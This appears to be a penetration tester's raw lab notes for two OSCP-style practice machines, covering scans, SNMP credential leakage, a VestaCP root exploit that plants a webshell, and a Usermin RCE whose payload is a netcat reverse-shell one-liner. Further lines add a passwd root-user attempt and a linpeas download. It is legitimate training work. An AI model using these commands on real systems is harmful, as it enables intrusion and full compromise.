+| MD5:   c138:e1a0:63e1:6a81:8216:9422:a69c:9f04
+| SHA-1: 77de:42c7:3554:eecd:eb8b:5407:32cd:94e5:b4f2:5ee8
+
+POP3: 110 995
+110/tcp  open  pop3     syn-ack Dovecot pop3d
+|_ssl-date: TLS randomness does not represent time
+|_pop3-capabilities: STLS PIPELINING USER TOP RESP-CODES SASL(PLAIN LOGIN) CAPA AUTH-RESP-CODE UIDL
+| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US/emailAddress=admin@oscp.example.com/organizationalUnitName=IT/localityName=San Francisco
+| Issuer: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US/emailAddress=admin@oscp.example.com/organizationalUnitName=IT/localityName=San Francisco
+| Public Key type: rsa
+| Public Key bits: 4096
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2022-11-08T08:16:51
+| Not valid after:  2023-11-08T08:16:51
+| MD5:   c138:e1a0:63e1:6a81:8216:9422:a69c:9f04
+| SHA-1: 77de:42c7:3554:eecd:eb8b:5407:32cd:94e5:b4f2:5ee8
+
+995/tcp  open  ssl/pop3 syn-ack Dovecot pop3d
+| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US/emailAddress=admin@oscp.example.com/organizationalUnitName=IT/localityName=San Francisco
+| Issuer: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US/emailAddress=admin@oscp.example.com/organizationalUnitName=IT/localityName=San Francisco
+| Public Key type: rsa
+| Public Key bits: 4096
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2022-11-08T08:16:51
+| Not valid after:  2023-11-08T08:16:51
+| MD5:   c138:e1a0:63e1:6a81:8216:9422:a69c:9f04
+| SHA-1: 77de:42c7:3554:eecd:eb8b:5407:32cd:94e5:b4f2:5ee8
+|_ssl-date: TLS randomness does not represent time
+|_pop3-capabilities: TOP SASL(PLAIN LOGIN) USER RESP-CODES PIPELINING CAPA AUTH-RESP-CODE UIDL
+
+IMAP: 143 993
+143/tcp  open  imap     syn-ack Dovecot imapd (Ubuntu)
+| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US/emailAddress=admin@oscp.example.com/organizationalUnitName=IT/localityName=San Francisco
+| Issuer: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US/emailAddress=admin@oscp.example.com/organizationalUnitName=IT/localityName=San Francisco
+| Public Key type: rsa
+| Public Key bits: 4096
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2022-11-08T08:16:51
+| Not valid after:  2023-11-08T08:16:51
+| MD5:   c138:e1a0:63e1:6a81:8216:9422:a69c:9f04
+| SHA-1: 77de:42c7:3554:eecd:eb8b:5407:32cd:94e5:b4f2:5ee8
+|_ssl-date: TLS randomness does not represent time
+|_imap-capabilities: AUTH=PLAIN IMAP4rev1 ID OK AUTH=LOGINA0001 IDLE listed ENABLE SASL-IR LOGIN-REFERRALS Pre-login LITERAL+ have STARTTLS more capabilities post-login
+
+993/tcp  open  ssl/imap syn-ack Dovecot imapd (Ubuntu)
+| ssl-cert: Subject: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US/emailAddress=admin@oscp.example.com/organizationalUnitName=IT/localityName=San Francisco
+| Issuer: commonName=oscp.example.com/organizationName=Vesta Control Panel/stateOrProvinceName=California/countryName=US/emailAddress=admin@oscp.example.com/organizationalUnitName=IT/localityName=San Francisco
+| Public Key type: rsa
+| Public Key bits: 4096
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2022-11-08T08:16:51
+| Not valid after:  2023-11-08T08:16:51
+| MD5:   c138:e1a0:63e1:6a81:8216:9422:a69c:9f04
+| SHA-1: 77de:42c7:3554:eecd:eb8b:5407:32cd:94e5:b4f2:5ee8
+|_ssl-date: TLS randomness does not represent time
+|_imap-capabilities: Pre-login more AUTH=PLAIN IMAP4rev1 ID OK AUTH=LOGINA0001 have post-login IDLE capabilities listed ENABLE SASL-IR LOGIN-REFERRALS LITERAL+
+
+MYSQL: 3306
+3306/tcp open  mysql    syn-ack MySQL 5.7.40-0ubuntu0.18.04.1
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=MySQL_Server_5.7.40_Auto_Generated_Server_Certificate
+| Issuer: commonName=MySQL_Server_5.7.40_Auto_Generated_CA_Certificate
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2022-11-08T08:15:37
+| Not valid after:  2032-11-05T08:15:37
+| MD5:   f4c6:9de2:616c:2175:7a9a:5e70:1e28:26bc
+| SHA-1: 5201:83e4:1e97:d971:dbaa:9831:b3b7:5cc4:8fa6:641a
+| mysql-info: 
+|   Protocol: 10
+|   Version: 5.7.40-0ubuntu0.18.04.1
+|   Thread ID: 8
+|   Capabilities flags: 65535
+|   Some Capabilities: Speaks41ProtocolNew, ODBCClient, ConnectWithDatabase, IgnoreSigpipes, Support41Auth, SupportsCompression, DontAllowDatabaseTableColumn, InteractiveClient, SupportsTransactions, IgnoreSpaceBeforeParenthesis, LongPassword, SwitchToSSLAfterHandshake, FoundRows, Speaks41ProtocolOld, LongColumnFlag, SupportsLoadDataLocal, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
+|   Status: Autocommit
+|   Salt: "'s\x11\x06F]>s\x1A\x0Dcx:jb6G(\x7F
+|_  Auth Plugin Name: mysql_native_password
+
+
+				NMAP: UDP
+SNMP: 161
+┌──(kali㉿kali)-[~]
+└─$ sudo nmap -sU -O 192.168.216.156
+53/udp  open  domain
+161/udp open  snmp
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 2.6.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6.18
+OS details: Linux 2.6.18, Linux 2.6.30
+
+
+				SNMP: 161
+snmpwalk -c public -v1 -t 10 192.168.183.156
+iso.3.6.1.2.1.1.3.0 = Timeticks: (34259) 0:05:42.59
+iso.3.6.1.2.1.1.4.0 = STRING: "Me <Jack@oscp>"
+iso.3.6.1.2.1.1.5.0 = STRING: "oscp.exam"
+iso.3.6.1.2.1.1.6.0 = STRING: "Sitting on the Dock of the Bay"
+iso.3.6.1.2.1.1.7.0 = INTEGER: 72
+iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/boot/vmlinuz-4.15.0-20-generic root=/dev/mapper/oscp--vg-root ro
+
+snmpwalk -c public -v2c -t 10 192.168.183.156
+
+NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 = INTEGER: 2
+NET-SNMP-EXTEND-MIB::nsExtendCommand."reset-password" = STRING: /bin/sh
+NET-SNMP-EXTEND-MIB::nsExtendCommand."reset-password-cmd" = STRING: /bin/echo
+NET-SNMP-EXTEND-MIB::nsExtendArgs."reset-password" = STRING: -c "echo \"jack:3PUKsX98BMupBiCf\" | chpasswd"
+NET-SNMP-EXTEND-MIB::nsExtendOutLine."reset-password-cmd".1 = STRING: "jack:3PUKsX98BMupBiCf" | chpasswd
+
+jack:3PUKsX98BMupBiCf
+jack:3PUKsX98BMupBiCf\
+
+
+				SSH: 
+┌──(kali㉿kali)-[~]
+└─$ ssh jack@192.168.183.156
+
+┌──(kali㉿kali)-[~]
+└─$ ssh admin@192.168.183.156
+
+				FTP:
+emailAddress=admin@oscp.example.com
+
+┌──(kali㉿kali)-[~]
+└─$ ftp 192.168.183.156
+Connected to 192.168.183.156.
+220 (vsFTPd 3.0.3)
+Name (192.168.183.156:kali): jack
+331 Please specify the password.
+Password: 3PUKsX98BMupBiCf
+530 Login incorrect.
+ftp: Login failed
+ftp> exit
+221 Goodbye.
+                                                                                                  
+┌──(kali㉿kali)-[~]
+└─$ ftp 192.168.183.156
+Connected to 192.168.183.156.
+220 (vsFTPd 3.0.3)
+Name (192.168.183.156:kali): jack
+331 Please specify the password.
+Password: 3PUKsX98BMupBiCf\
+530 Login incorrect.
+ftp: Login failed
+
+┌──(kali㉿kali)-[~]
+└─$ ftp admin@192.168.183.156
+Connected to 192.168.183.156.
+220 (vsFTPd 3.0.3)
+331 Please specify the password.
+Password: 
+530 Login incorrect.
+ftp: Login failed
+ftp> exit
+221 Goodbye.
+
+				MYSQL: 3306 - NONE
+kali@kali:~$ mysql -u jack -p'3PUKsX98BMupBiCf' -h 192.168.183.156 -P 3306
+kali@kali:~$ mysql -u jack -p'3PUKsX98BMupBiCf\' -h 192.168.183.156 -P 3306
+kali@kali:~$ mysql -u admin -p'3PUKsX98BMupBiCf' -h 192.168.183.156 -P 3306
+kali@kali:~$ mysql -u admin -p'3PUKsX98BMupBiCf\' -h 192.168.183.156 -P 3306
+ERROR 1045 (28000): Access denied for user 'jack'@'192.168.45.175' (using password: YES)
+
+jack:3PUKsX98BMupBiCf
+jack:3PUKsX98BMupBiCf\
+
+			HTTP: 80 8080 8083 8443
+
+			http://192.168.183.156/
+commonName=oscp.example.com
+
+┌──(kali㉿kali)-[~]
+└─$ sudo nano /etc/hosts
+192.168.183.156 oscp.example.com
+192.168.183.156 oscp.exam
+
+codemirror 5.4.0 
+searchsploit codemirror 5.4.0 
+
+Server control panel by VESTA
+┌──(kali㉿kali)-[~]
+└─$ searchsploit vesta    
+ActiveState Perl.exe x64 Client 5.20.2 - Crash (PoC)            | windows_x86-64/dos/38085.pl
+MediaHouse Software Statistics Server LiveStats 5.2 - Remote Bu | windows/remote/20148.pl
+netkit-telnet-0.17 telnetd (Fedora 31) - 'BraveStarr' Remote Co | linux/remote/48170.py
+Vesta Control Panel 0.9.8 - OS Command Injection                | php/webapps/37369.txt
+Vesta Control Panel 0.9.8-15 - Persistent Cross-Site Scripting  | php/webapps/39468.txt
+Vesta Control Panel 0.9.8-16 - Local Privilege Escalation       | linux/local/40953.sh
+Vesta Control Panel 0.9.8-26 - Authenticated Remote Code Execut | multiple/webapps/48294.rb
+VestaCP 0.9.8 - 'v_interface' Add IP Stored XSS                 | multiple/webapps/49662.txt
+VestaCP 0.9.8 - 'v_sftp_licence' Command Injection              | multiple/webapps/49674.txt
+VestaCP 0.9.8 - File Upload CSRF                                | multiple/webapps/49659.html
+VestaCP 0.9.8-26 - 'backup' Information Disclosure              | multiple/webapps/49220.txt
+VestaCP 0.9.8-26 - 'LoginAs' Insufficient Session Validation    | multiple/webapps/49219.txt
+
+			http://oscp.example.com
+feroxbuster -u http://oscp.example.com -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e 
+
+301      GET        7l       20w      243c http://oscp.example.com/phpmyadmin => http://oscp.example.com/phpmyadmin/
+301      GET        7l       20w      242c http://oscp.example.com/roundcube => http://oscp.example.com/roundcube/
+200      GET      139l      320w     8021c http://oscp.example.com/server-status
+
+200      GET       26l       84w     1055c http://oscp.example.com/
+200      GET       26l       84w     1055c http://oscp.example.com/index.html
+301      GET        7l       20w      240c http://oscp.example.com/webmail => http://oscp.example.com/webmail/
+200      GET        3l        8w       65c http://oscp.example.com/robots.txt
+
+404      GET        0l        0w     1402c http://oscp.example.com/xbox-360
+404      GET        0l        0w     1402c http://oscp.example.com/disaster.asp
+404      GET        0l        0w     1402c http://oscp.example.com/1097.asp
+404      GET        0l        0w     1402c http://oscp.example.com/gas.jsp
+404      GET        0l        0w     1402c http://oscp.example.com/1183.txt
+404      GET        0l        0w     1402c http://oscp.example.com/ethernet.aspx
+
+			http://oscp.exam/
+feroxbuster -u http://oscp.exam/ -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e 
+
+301      GET        7l       20w      236c http://oscp.exam/phpmyadmin => http://oscp.exam/phpmyadmin/
+301      GET        7l       20w      235c http://oscp.exam/roundcube => http://oscp.exam/roundcube/
+200      GET      141l      319w     8084c http://oscp.exam/server-status
+
+
+200      GET       26l       84w     1055c http://oscp.exam/
+200      GET       26l       84w     1055c http://oscp.exam/index.html
+301      GET        7l       20w      233c http://oscp.exam/webmail => http://oscp.exam/webmail/
+200      GET        3l        8w       65c http://oscp.exam/robots.txt
+
+404      GET        0l        0w     1402c http://oscp.exam/scene.txt
+404      GET        0l        0w     1402c http://oscp.exam/1244.txt
+404      GET        0l        0w     1402c http://oscp.exam/1301
+
+
+			http://oscp.exam/webmail/?_task=login
+jack:3PUKsX98BMupBiCf
+jack:3PUKsX98BMupBiCf\
+
+			http://oscp.exam/phpmyadmin/
+ #1045 - Access denied for user 'jack'@'localhost' (using password: YES)
+
+
+			http://192.168.183.156/8080
+404
+Page Not Found
+It seems that the page you were trying to reach does not exist anymore, or maybe it has just moved. You can start again from the home or go back to previous page.
+
+feroxbuster -u http://192.168.183.156/8080 -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e 
+
+
+			https://192.168.183.156/8083
+404
+Page Not Found
+It seems that the page you were trying to reach does not exist anymore, or maybe it has just moved. You can start again from the home or go back to previous page.
+
+feroxbuster -u http://192.168.183.156/8083 -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e 
+
+
+			http://192.168.183.156/8443
+404
+Page Not Found
+It seems that the page you were trying to reach does not exist anymore, or maybe it has just moved. You can start again from the home or go back to previous page.
+
+feroxbuster -u http://192.168.183.156/8443 -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e 
+
+			
+			CVE-N/A - vestaROOT.py
+	https://github.com/rekter0/exploits/blob/master/VestaCP/vestaROOT.py
+https://github.com/rekter0/exploits/blob/master/VestaCP/videos/vestaROOT.mp4
+	https://ssd-disclosure.com/ssd-advisory-vestacp-lpe-vulnerabilities/
+	https://ssd-disclosure.com/ssd-advisory-vestacp-multiple-vulnerabilities/
+
+┌──(kali㉿kali)-[~/Desktop/C/156]
+└─$ chmod +x vestaROOT.py 
+
+┌──(kali㉿kali)-[~/Desktop/C/156]
+└─$ python3 vestaROOT.py http://192.168.183.156:8083 Jack 3PUKsX98BMupBiCf
+Traceback (most recent call last):
+  File "/home/kali/Desktop/C/156/vestaROOT.py", line 1, in <module>
+    from VestaFuncs import *
+ModuleNotFoundError: No module named 'VestaFuncs'
+
+https://github.com/rekter0/exploits/blob/master/VestaCP/VestaFuncs.py
+
+┌──(kali㉿kali)-[~/Desktop/C/156]
+└─$ chmod +x VestaFuncs.py 
+
+┌──(kali㉿kali)-[~/Desktop/C/156]
+└─$ sudo python3 VestaFuncs.py 
+
+┌──(kali㉿kali)-[~/Desktop/C/156]
+└─$ sudo python3 vestaROOT.py http://192.168.183.156:8083 Jack 3PUKsX98BMupBiCf
+[+] Logged in as Jack
+[!] 74rb5x2cby.poc not found, creating one...
+Expecting value: line 1 column 1 (char 0)
+
+			WORKED WITH HTTPS: CHECK NMAP
+
+┌──(kali㉿kali)-[~/Desktop/C/156]
+└─$ sudo python3 vestaROOT.py https://192.168.183.156:8083 Jack 3PUKsX98BMupBiCf
+[+] Logged in as Jack
+[!] 7axnunzwwf.poc not found, creating one...
+[+] 7axnunzwwf.poc added
+[+] 7axnunzwwf.poc found, looking up webshell
+[!] webshell not found, creating one..
+[+] Webshell uploaded
+[!] Mail domain not found, creating one..
+[+] Mail domain created
+[+] Mail account created
+[+] root shell possibly obtained
+
+# whoami
+root
+
+# hostname
+oscp.exam
+
+# id
+uid=0(root) gid=0(root) groups=0(root)
+
+# pwd
+/usr/local/vesta/web/api/v1/edit/mail
+
+# cat /root/proof.txt
+cc113ebf524e59e1aa482bcbdeaaaee1
+
+# cat /home/Jack/local.txt
+85d4a3364c9e8b2acdfa50251cfe7f33
+
+--------------------------------------------------------------------------------------------------
+			192.168.216.157 - Charlie OS ✅
+FTP: 21
+SSH: 22
+HTTP: 80 20000
+
+				NMAP: TCP
+┌──(kali㉿kali)-[~]
+└─$ nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 192.168.216.157
+
+FTP: 21
+21/tcp    open  ftp     syn-ack vsftpd 3.0.5
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxr-xr-x    2 114      120          4096 Nov 02  2022 backup
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:192.168.45.243
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.5 - secure, fast, stable
+|_End of status
+
+SSH: 22
+22/tcp    open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 0e:ad:d7:de:60:2b:49:ef:42:3b:1e:76:9c:77:33:85 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDgOW8ymdWGirANMxy328NDou2iNVELss8KVBPo4/0RxWRQ7MbMwf5VtjAn0cIC1DPZWp1c8E5p05o0ufmzcobE=
+|   256 99:b5:48:fb:77:df:18:b0:1d:ad:e0:92:f3:e1:26:0d (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOcvwjiMZCf9LuiRvrWurAOTHTN7AjL685hG5dVFdM7a
+
+HTTP: 80 20000
+80/tcp    open  http    syn-ack Apache httpd 2.4.52 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: OPTIONS HEAD GET POST
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+20000/tcp open  http    syn-ack MiniServ 1.820 (Webmin httpd)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Site doesn't have a title (text/html; Charset=utf-8).
+|_http-favicon: Unknown favicon MD5: 7533509A5A4350D01C0CD6461F8CA7F3
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+				NMAP: UDP
+┌──(kali㉿kali)-[~]
+└─$ sudo nmap -sU -O 192.168.216.157
+All 1000 scanned ports on 192.168.216.157 are in ignored states.
+
+				FTP: 21 
+┌──(kali㉿kali)-[~]
+└─$ ftp 192.168.216.157
+Connected to 192.168.216.157.
+220 (vsFTPd 3.0.5)
+Name (192.168.216.157:kali): anonymous
+331 Please specify the password.
+Password: anonymous
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering Extended Passive Mode (|||10090|)
+150 Here comes the directory listing.
+drwxr-xr-x    2 114      120          4096 Nov 02  2022 backup
+
+ftp> cd backup
+250 Directory successfully changed.
+
+ftp> ls
+229 Entering Extended Passive Mode (|||10098|)
+150 Here comes the directory listing.
+-rw-r--r--    1 114      120        145831 Nov 02  2022 BROCHURE-TEMPLATE.pdf
+-rw-r--r--    1 114      120        159765 Nov 02  2022 CALENDAR-TEMPLATE.pdf
+-rw-r--r--    1 114      120        336971 Nov 02  2022 FUNCTION-TEMPLATE.pdf
+-rw-r--r--    1 114      120        739052 Nov 02  2022 NEWSLETTER-TEMPLATE.pdf
+-rw-r--r--    1 114      120        888653 Nov 02  2022 REPORT-TEMPLATE.pdf
+
+ftp> get BROCHURE-TEMPLATE.pdf
+ftp> get CALENDAR-TEMPLATE.pdf
+ftp> get FUNCTION-TEMPLATE.pdf
+ftp> get NEWSLETTER-TEMPLATE.pdf
+ftp> get REPORT-TEMPLATE.pdf
+
+# Exiftool: 
+exiftool -a -u BROCHURE-TEMPLATE.pdf
+exiftool -a -u CALENDAR-TEMPLATE.pdf
+exiftool -a -u FUNCTION-TEMPLATE.pdf
+Author                          : Cassie
+Creator                         : Microsoft® Word 2016
+exiftool -a -u NEWSLETTER-TEMPLATE.pdf
+Author                          : Mark
+Creator                         : Microsoft® Word 2016
+exiftool -a -u REPORT-TEMPLATE.pdf
+Author                          : Robert
+Creator                         : Microsoft® Word 2016
+
+
+				SSH: 22
+Cassie
+Mark
+Robert
+
+				HTTP:
+http://192.168.216.157/
+
+Web servers
+- Apache HTTP Server 2.4.52
+Operating systems
+- Ubuntu
+
+http://192.168.216.157:20000/
+Error - Document follows
+This web server is running in SSL mode. Try the URL https://oscp:20000/ instead.
+
+┌──(kali㉿kali)-[~]
+└─$ sudo nano /etc/hosts
+192.168.216.157 oscp
+
+https://oscp:20000/
+Usermin
+You must enter a username and password to login to the server on oscp
+
+┌──(kali㉿kali)-[~]
+└─$ searchsploit Usermin     
+Usermin 1.750 - Remote Command Execution (Metasploit)           | linux/webapps/46468.rb
+Usermin 1.820 - Remote Code Execution (RCE) (Authenticated)     | linux/webapps/50234.py
+Webmin 0.9x / Usermin 0.9x/1.0 - Access Session ID Spoofing     | linux/remote/22275.pl
+Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure    | multiple/remote/1997.php
+Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure    | multiple/remote/2017.pl
+
+https://oscp:20000/
+Cassie:Cassie
+
+		Usermin 1.820 - Remote Code Execution (RCE) (Authenticated)
+https://www.exploit-db.com/exploits/50234
+
+┌──(kali㉿kali)-[~/Desktop/C/157]
+└─$ chmod +x 50234.py 
+
+    listen_ip = "192.168.45.243"
+    listen_port = 1337
+
+┌──(kali㉿kali)-[~]
+└─$ nc -nvlp 1337
+
+┌──(kali㉿kali)-[~/Desktop/C/157]
+└─$ python3 50234.py -u 192.168.216.157 -l cassie -p cassie
+[+] Target https://192.168.216.157:20000
+[+] Login successfully
+[+] Setup GnuPG
+[+] Payload {'name': '";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.243 1337 >/tmp/f;echo "', 'email': '1337@webmin.com'}
+[+] Setup successful
+[+] Fetching key list
+[+] Key : idx=1\
+
+
+				Foothold: Local.txt
+┌──(kali㉿kali)-[~]
+└─$ nc -nvlp 1337
+listening on [any] 1337 ...
+connect to [192.168.45.243] from (UNKNOWN) [192.168.216.157] 40932
+
+sh-5.1$ whoami
+cassie
+
+sh-5.1$ pwd
+/usr/share/usermin/gnupg
+
+sh-5.1$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+cassie@oscp:/usr/share/usermin/gnupg/$ 
+
+cassie@oscp:/usr/share/usermin/gnupg/$ cd ~
+
+cassie@oscp:~$ ls
+local.txt
+
+cassie@oscp:~$ cat local.txt
+6289b0c19eb776ba49584162170517e0
+
+
+				Priv Esc: Proof.txt
+cassie@oscp:~$ sudo -l
+[sudo] password for cassie: cassie
+Sorry, user cassie may not run sudo on oscp.
+
+cassie@oscp:~$ sudo i
+sudo i
+[sudo] password for cassie: cassie
+cassie is not in the sudoers file.  This incident will be reported.
+
+cassie@oscp:~$ su mark
+Password: mark
+su: Authentication failure
+
+cassie@oscp:~$ su robert
+Password: robert
+su: Authentication failure
+
+cassie@oscp:~$ su root
+Password: root
+su: Authentication failure
+
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+pollinate:x:105:1::/var/cache/pollinate:/bin/false
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+syslog:x:107:113::/home/syslog:/usr/sbin/nologin
+uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
+tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
+landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
+usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+cassie:x:1000:1000:CLWEB:/home/cassie:/bin/bash
+lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
+fwupd-refresh:x:113:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+robert:x:1010:1010::/home/robert:/bin/bash
+mark:x:1010:1010::/home/robert:/bin/bash
+ftp:x:114:120:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
+
+			# Add Root User /etc/passwd
+cassie@oscp:~$ ls -la /etc/passwd
+-rw-r--r-- 1 root root 1971 Nov  2  2022 /etc/passwd
+
+cassie@oscp:~$ openssl passwd w00t
+$1$.EIRv0Bq$IDBOVMjBaM7OpA1cVOZ6w1
+
+cassie@oscp:~$ echo "root2:$1$.EIRv0Bq$IDBOVMjBaM7OpA1cVOZ6w1:0:0:root:/root:/bin/bash" >> /etc/passwd
+bash: /etc/passwd: Permission denied
+
+cassie@oscp:~$ cat /etc/shadow
+cat: /etc/shadow: Permission denied
+
+
+				#LINPEAS:
+python3 -m http.server 80
+wget http://192.168.45.243:80/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+
+Distributor ID: Ubuntu
+Description:    Ubuntu 22.04.1 LTS
+Release:        22.04
+Codename:       jammy
+
+╔══════════╣ Executing Linux Exploit Suggester
+╚ https://github.com/mzet-/linux-exploit-suggester                                                
+cat: write error: Broken pipe                                                                     
+cat: write error: Broken pipe
+[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)
+   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
+https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
+   Exposure: probable
+   Tags: [ ubuntu=(22.04) ]{kernel:5.15.0-27-generic}
+   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
+   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)
+[+] [CVE-2022-2586] nft_object UAF
+   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
+   Exposure: less probable
+   Tags: ubuntu=(20.04){kernel:5.12.13}
+   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
+   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)
+[+] [CVE-2022-0847] DirtyPipe
+   Details: https://dirtypipe.cm4all.com/
+   Exposure: less probable
+   Tags: ubuntu=(20.04|21.04),debian=11
+   Download URL: https://haxx.in/files/dirtypipez.c
+[+] [CVE-2021-4034] PwnKit
+   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
+   Exposure: less probable
+   Tags: ubuntu=10|11|12|13|14|15|16|17|18|19|20|21,debian=7|8|9|10|11,fedora,manjaro
+   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
+[+] [CVE-2021-3156] sudo Baron Samedit
+   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
+   Exposure: less probable
+   Tags: mint=19,ubuntu=18|20, debian=10
+   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main
+[+] [CVE-2021-3156] sudo Baron Samedit 2
+   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
+   Exposure: less probable
+   Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10
+   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main
+[+] [CVE-2021-22555] Netfilter heap out-of-bounds write
+   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
+   Exposure: less probable
+   Tags: ubuntu=20.04{kernel:5.8.0-*}
+   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
+   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
+   Comments: ip_tables kernel module must be loaded
+[+] [CVE-2017-5618] setuid screen v4.5.0 LPE
+   Details: https://seclists.org/oss-sec/2017/q1/184
+   Exposure: less probable
+   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154
+
+╔══════════╣ Active Ports
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                     
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      - 
+
